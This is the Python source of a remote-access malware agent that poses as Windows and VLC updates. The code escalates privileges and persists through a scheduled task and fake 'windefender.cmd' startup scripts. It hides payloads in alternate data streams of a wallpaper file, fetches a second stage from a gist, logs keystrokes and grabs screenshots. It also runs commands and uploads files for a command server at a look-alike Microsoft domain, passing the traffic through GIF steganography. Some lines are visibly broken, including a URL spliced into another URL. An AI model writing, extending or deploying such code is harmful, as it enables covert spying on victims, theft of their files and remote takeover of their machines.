#!/usr/bin/env python3
import socket
import os
import ctypes #https://www.doyler.net/security-not-included/executing-shellcode-with-python
import requests
import zipfile
import tempfile
import base64
import json
import websockets
import asyncio
import sys
import time
import codecs
import pyscreenshot as ImageGrab
import keyboard
from random import randrange
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad

C2='http://microsoftonline.download'
GIF_FILE='/tmp/sanic.gif'
if os.name == 'nt':
    GIF_FILE='C:\\WinCache\\sanic.gif'
KEY='HKEY_USERS\\admin'.encode('utf-8')
IV='C:\\Users\\admin\\$'.encode('utf-8')
WS_URL=codecs.encode('ws://microsoftonline.download/windowsupdates/')
UID = None
print(KEY)
BUFFER_SIZE = 8192

aes = AES.new(KEY, AES.MODE_ECB)
BLOCK_SIZE = 16

waiting = False
running = True
SLEEP_TIME = 8
KEYLOG_FILE='keys.log'
KEYLOG_PATH="/tmp/" + "keys.log"
PID_FILE="/tmp/agent.pid"
if os.name == 'nt':
    KEYLOG_PATH = os.getenv('APPDATA'+'\\..\\Local\\'+'keys.log')
    PID_FILE = os.getenv('APPDATA'+'\\agent.pid')
DEBUG = True

def powerstealth(cmd):
    try:
        if DEBUG:
            os.system("powershell.exe -c \"%s\"" %cmd)
        else:
            os.system("powershell.exe -windowstyle hidden -c \"%s\"" %cmd)
    except Exception as e:
        if DEBUG:
            print(e)
            
def elevate():
    isAdmin = False
    try:
        isAdmin = ctypes.windll.shell32.IsUserAnAdmin()
        stage1_ps1 = 'powershell.exe -windowstyle hidden -c "type C:\\WinCache\\stage1.py | C:\\WinCache\\vlc_updater.exe"'
        if not os.path.isfile('C:\\WinCache\\stage1.ps1'):
            with open('C:\\WinCache\\stage1.ps1', "w+") as f:
                f.write(stage1_ps1)
    except Exception as e:
        if DEBUG:
            raise(e)
        pass
    if not isAdmin and os.name == 'nt':
        if DEBUG:
            print('User is not admin')
        if ctypes.windll.shell32.ShellExecuteW(None, "runas", "powershell.exe", 'C:\\WinCache\\stage1.ps1', None, 1) > 32:
            exit()

def hide():
    w = os.getenv('USERPROFILE') + '\\' + 'Pictures' + '\\' + 'wallpaper.jpeg'
    if not os.path.isfile(w) or True:
        r = requests.get('https://images.pexels.com/photos/1054201/pexels-photo-1054201.jpeg?crop=eagropy&cs=srgb&dl=pexels-stephan-seeber-1054201.jpg&fit=crop&fm=jpg&h=1280&w=1920')
        with open(w, 'wb') as f:
            f.write(r.content)
        powerstealth("Invoke-WebRequest https://gist.githubusercontent.com/7h30WLMan/a2403bf963f9c00c0ac5583a1de60d98/raw/33b9c46f0a4d4fb5c93'http://microsoftonline.download'9a88b5e732724154246/stage2.py -OutFile C:\\WinCache\\stage2.py")
        os.system("type C:\\WinCache\\vlc_updater.exe > %s:py.exe" %w)
        os.system("type C:\\WinCache\\stage2.py > %s:stage2.py" %w)
        tmp = tempfile.NamedTemporaryFile(delete=False)
        run_stealth = "wmic process call create \"%s:py.exe %s:stage2.py\"" %(w, w)
        with open(tmp.name, "a+") as f:
            f.write(run_stealth)
        os.system("type %s > %s:run.ps1" %(tmp.name, w))
        try:
            with open(os.getenv('APPDATA')+'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windefender.cmd', "w+") as f:
                f.write(run_stealth)
        except Exception as e:
            pass
        try:
            with open(os.getenv('ProgramData')+'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windefender.cmd', "w+") as f:
                f.write(run_stealth)
        except Exception as e:
            pass

def decrypt(raw):
    return unpad(aes.decrypt(raw), BLOCK_SIZE).decode("utf-8", errors="ignore")

def encrypt(raw):
    return aes.encrypt(pad((raw.encode() if type(raw) == str else raw), BLOCK_SIZE, style="pkcs7"))

def encapsulate(instruction):
    temp_gif = tempfile.NamedTemporaryFile(delete=False)
    data = encrypt(json.dumps(instruction))
    with open(GIF_FILE, "rb") as gif_f:
        gif_content = gif_f.read()
        with open(temp_gif.name+'.gif') as out_f:
            out_f.write(gif_content)
            out_f.write('HIDDEN_CONTENT_SEPARATOR'.encode('utf-8'))
            out_f.write(data)
            return temp_gif.name+'.gif'

def rm_pid():
    if DEBUG:
        print('rm_pid...')
    if os.path.isfile(PID_FILE):
        with open(PID_FILE) as f:
            f_contents = f.read()
            if DEBUG:
                print('pidfile : '+f_contents)
            if "%s" %os.getpid() in f_contents:
                return
            if time.time() - os.path.getmtime(PID_FILE) > 0:
                os.unlink(PID_FILE)
                print('removed pidfile '+PID_FILE)
            elif DEBUG:
                print('pidfile is not old enough to be removed')
                
        #powerstealth("rm %s" %PID_FILE)

def get_uid():
    global UID
    filepath = '/tmp/uid.txt'
    if os.name == 'nt':
        filepath = os.getenv('APPDATA')+'\\'+'uid.txt'

    if os.path.exists(filepath):
        with open(filepath) as f:
            UID = f.read()
    else:
        with open(filepath, "a+") as f:
            UID = "%s-%s-%s" %(randrange(1024, 8192), randrange(1024, 8192), randrange(1024, 8192))
            f.write(UID)
    if DEBUG:
        print('UID is :', UID)
    return UID

def post_exp():
    create_task_ps1 = 'schtasks /create /F /IT /tn WinCache /tr \"powershell C:\\WinCache\\stage1.ps1\" /sc onlogon /ru System'
    stage1_ps1 = 'powershell.exe -c "type C:\\WinCache\\stage1.py | C:\\WinCache\\vlc_updater.exe"'
    if not os.path.isfile('C:\\WinCache\\task1.ps1'):
        with open('C:\\WinCache\\task.ps1', "w+") as f:
            f.write(create_task_ps1)
    if not os.path.isfile('C:\\WinCache\\stage1.ps1'):
        with open('C:\\WinCache\\stage1.ps1', "w+") as f:
            f.write(stage1_ps1)
    if os.path.isfile("%s\\Downloads\\dropper.exe" %os.getenv('USERPROFILE')):
        powerstealth("rm %s\\Downloads\\dropper.exe" %os.getenv('USERPROFILE'))
    powerstealth('C:\\WinCache\\task.ps1')
    powerstealth('attrib +h /s /d C:\\WinCache')
    if not os.path.isfile(GIF_FILE):
        with open(GIF_FILE, 'wb') as f:
            r = requests.get('https://media.giphy.com/media/77er1c9H3KJnq/giphy.gif')
            f.write(r.content)

def package(filepath):
    temp_zip = tempfile.NamedTemporaryFile(delete=False)
    temp_gif = tempfile.NamedTemporaryFile(delete=False)
    with zipfile.ZipFile(temp_zip.name, "w") as f:
        f.write(filepath)
    with open(GIF_FILE, "rb") as gif_f:
        gif_content = gif_f.read()
        with open(temp_zip.name, "rb") as zip_f:
            zip_content = zip_f.read()
            with open(temp_gif.name+'.gif', "ab+") as out_f:
                out_f.write(gif_content)
                out_f.write('HIDDEN_CONTENT_SEPARATOR'.encode('utf-8'))
                out_f.write(zip_content)

def send(instruction, data=None):
    if DEBUG:
        print('Sending ', instruction)
    filename = encapsulate(dict(type=instruction, data=data))
    r = requests.post('http://microsoftonline.download'+'/giphy/'+UID+'.gif', files=dict(payload=open(filename, 'rb')))

def on_keypress(event):
    with open("/tmp/" + 'keys.log', 'a+') as f:
        if event.name == 'event':
            f.write('\r\n')
        else:
            f.write("%s" %event.name)

def handle_instruction(instruction):
    if DEBUG:
        print('Handling ', instruction)
    if instruction.get('type') == 'EXECUTE' and instruction.get('data'):
        powerstealth(instruction.get('data'))
    elif instruction.get('type') == 'UPDATE':
        if os.path.isfile('C:\\WinCache\\stage1.py'):
            with open('C:\\WinCache\\stage1.py', "w+") as f:
                content = f.read()
                r = requests.get('http://microsoftonline.download'+'/updates/KB4540673.msi')
                if content != r.content:
                    f.write(r.content.decode('utf-8'))
                    rm_pid()
                    ctypes.windll.shell32.ShellExecuteW(None, "", 'powershell.exe', '-windowstyle hidden C:\\WinCache\\stage1.ps1', None, 1)
                    exit()
    elif instruction.get('type') == 'DOWNLOAD':
        if os.path.isfile(instruction.get('data')):
            with open(instruction.get('data'), "rb") as f:
                send('UPLOAD', f.read()).decode("utf-8")
        elif DEBUG:
            print('File not found : ', instruction.get('data'))
    elif instruction.get('type') == 'SCREENSHOT':
        im = ImageGrab.grab()
        if os.name == 'nt':
            im.save(os.getenv('APPDATA'+'\\..\\Local\\'+'lastscreen.png'))
        else:
            im.save('/tmp/lastscreen.png')

async def ws_agent():
    global running, waiting
    websocket = await websockets.connect(WS_URL+UID, ping_interval=None)
    if DEBUG:
        print('Websocket connected', websocket)
    while running and not waiting:
        try:
            if not websocket.open:
                print('Websocket closed, reopening')
                websocket = await websockets.connect(WS_URL+UID, ping_interval=None)
            data = None
            message = None
            try:
                data = await websocket.recv()
            except Exception as e:
                print('No data was sent, io error from the server?!')
                continue
            if DEBUG:
                print('Raw data', data)
            try:
                message = decrypt(data)
                if "not supported" in message:
                    continue
            except Exception as e:
                if DEBUG:
                    print('Error: Could not decrypt', data)
                continue
            if DEBUG:
                print('Received', message)
            try:
                response = handle_instruction(json.loads(message))
            except Exception as e:
                if DEBUG:
                    raise(e)
                    print('Could not handle instruction :', message)
            await websocket.send(encrypt(json.dumps(dict(type="PING", data="64646464646464"))))
            data = await websocket.recv()
            if DEBUG:
                print('decrypted [%s]' %decrypt(data))
        except Exception as e:
            if DEBUG:
                print(e)
                raise(e)
            return
        await websocket.close()
        return



def check_broad_instr():
    r = requests.get('http://microsoftonline.download'+'/giphy/'+UID+'.gif')
    try:
        content = r.content.split('HIDDEN_CONTENT_SEPARATOR'.encode('utf-8'))[1]
        message = decrypt(content)
        if DEBUG:
            print('Decrypted broadcasted content', message)
        if len(message):
            instr = json.loads(message)
            handle_instruction(instr)
    except Exception as e:
        if DEBUG:
            raise(e)
        pass

def main():
    global waiting, running
    try:
        if not waiting:
            get_uid()
            if os.name == 'nt':
#                get_uid()
                elevate()
                post_exp()
                hide()
                check_broad_instr()
                keyboard.on_release(callback=on_keypress)
                if DEBUG:
                    print('keylogger started')
            if DEBUG:
                print('grabbed screen')
            im = ImageGrab.grab()
            if os.name == 'nt':
                im.save(os.getenv('APPDATA'+'\\..\\Local\\'+'lastscreen.png'))
            else:
                im.save('/tmp/lastscreen.png')
        slept = 0
        while running:
            rewrite_pid = False
            if os.path.isfile(PID_FILE):
                with open(PID_FILE) as f:
                    pidfile_contents = f.read()
                    if str(os.getpid()) in pidfile_contents:
                        if time.time() - os.path.getmtime(PID_FILE) > 0:
                            rewrite_pid = True
                        elif DEBUG:
                            print('pidfile is ours but not old enough to be renewed')
                    else:
                        if DEBUG:
                            print('pidfile already existing and is not ours, waiting')
                        waiting = False
            else:
                rewrite_pid = True
            if rewrite_pid:
                print('Rewriting pidfile with', os.getpid())
                with open(PID_FILE, "w+") as f:
                    f.write(str(os.getpid()))
                waiting=False
            else:
                waiting = True
                with open(PID_FILE, "a+") as f:
                    f.write(str(os.getpid()))
            ws_agent()
            if not waiting:
                asyncio.get_event_loop().run_until_complete(ws_agent())
            else:
                if slept >= 100000:
                    rm_pid()
                    slept = 0
                else:
                    time.sleep(SLEEP_TIME)
                    slept += 1
                    if DEBUG:
                        print('Slept', slept)
    except Exception as e:
        if DEBUG:
            raise(e)
        rm_pid()
        return 1
    return 0

if __name__ == "__main__":
    while True:
        try:
            main()
        except Exception as e:
            raise(e)
            pass
        rm_pid()
        if DEBUG:
            print('Something went wrong... Going to sleep for %s' %SLEEP_TIME)
        time.sleep(SLEEP_TIME)
